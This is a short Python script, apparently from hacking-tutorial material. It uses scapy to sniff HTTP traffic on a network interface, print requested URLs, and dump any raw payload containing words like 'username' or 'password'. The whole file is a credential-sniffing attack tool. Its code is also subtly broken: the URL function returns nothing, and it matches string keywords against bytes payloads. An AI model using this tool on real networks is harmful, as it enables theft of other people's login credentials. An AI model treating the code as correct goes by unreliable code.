import scapy.all as scapy
from scapy.layers import http
import optparse


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="interface")
    (option, arguments) = parser.parse_args()

    return option


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniff_packet)


def get_url(packet):
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load_raw = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass"]

        for key in keywords:
            if key in load_raw:
                return load_raw


def process_sniff_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(f"\n[+] Url found - {url}")
        login_info = get_login_info(packet)

        if login_info:
            print(f"[+] Possible username/login :: \n{login_info}\n\n")


if __name__ == "__main__":

    options = get_arguments()
    interface = options.interface

    sniff(interface)
